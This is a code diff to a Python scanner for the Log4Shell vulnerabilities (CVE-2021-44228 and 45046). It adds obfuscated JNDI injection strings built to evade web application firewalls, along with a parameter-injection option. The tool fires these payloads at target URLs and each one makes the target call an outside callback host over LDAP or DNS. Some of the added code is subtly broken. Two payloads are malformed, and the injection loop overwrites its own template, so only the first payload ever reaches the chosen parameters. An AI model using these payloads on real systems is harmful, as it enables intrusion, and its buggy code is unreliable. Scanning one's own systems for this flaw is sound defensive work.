@@ -61,6 +61,15 @@ waf_bypass_payloads = ["${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{
                        "${jndi:dns://{{callback_host}}/{{random}}}",
                        "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
                        "${jndi:dns://{{callback_host}}}",
+                       "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
+                       "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
+                       "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
                        "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
                        "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
                        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
@@ -70,7 +79,7 @@ cve_2021_45046 = [
                   "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}", # Source: https://twitter.com/marcioalm/status/1471740771581652995,
                   "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
                   "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
-                 ]
+                 ]  
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-u", "--url",
@@ -133,6 +142,11 @@ parser.add_argument("--disable-http-redirects",
                     dest="disable_redirects",
                     help="Disable HTTP redirects. Note: HTTP redirects are useful as it allows the payloads to have higher chance of reaching vulnerable systems.",
                     action='store_true')
+parser.add_argument("--target-parameters",
+                    dest="target_parameters",
+                    help="Provide target paramters (Ex: 'param1=value1&param2={{inject}}&param3={{inject}}' (Default : v)",
+                    default="v={{inject}}",
+                    action='store')
 
 args = parser.parse_args()
 
@@ -141,8 +155,14 @@ proxies = {}
 if args.proxy:
     proxies = {"http": args.proxy, "https": args.proxy}
 
+
+if args.target_parameters:
+    args.target_parameters = { i.split('=',1)[0] : i.split('=',1)[1] for i in args.target_parameters.split('&')}
+
+
 if args.custom_waf_bypass_payload:
     waf_bypass_payloads.append(args.custom_waf_bypass_payload)
+
 
 def get_fuzzing_headers(payload):
     fuzzing_headers = {}
@@ -303,11 +323,15 @@ def scan_url(url, callback_host):
 
     for payload in payloads:
         cprint(f"[•] URL: {url} | PAYLOAD: {payload}", "cyan")
+        for key, val in args.target_parameters.items():
+            if val == '{{inject}}':
+                args.target_parameters[key] = val.replace('{{inject}}', payload)
+
         if args.request_type.upper() == "GET" or args.run_all_tests:
             try:
                 requests.request(url=url,
                                  method="GET",
-                                 params={"v": payload},
+                                 params=args.target_parameters,
                                  headers=get_fuzzing_headers(payload),
                                  verify=False,
                                  timeout=timeout,
@@ -321,7 +345,7 @@ def scan_url(url, callback_host):
                 # Post body
                 requests.request(url=url,
                                  method="POST",
-                                 params={"v": payload},
+                                 params=args.target_parameters,
                                  headers=get_fuzzing_headers(payload),
                                  data=get_fuzzing_post_data(payload),
                                  verify=False,
@@ -335,7 +359,7 @@ def scan_url(url, callback_host):
                 # JSON body
                 requests.request(url=url,
                                  method="POST",
-                                 params={"v": payload},
+                                 params=args.target_parameters,
                                  headers=get_fuzzing_headers(payload),
                                  json=get_fuzzing_post_data(payload),
                                  verify=False,
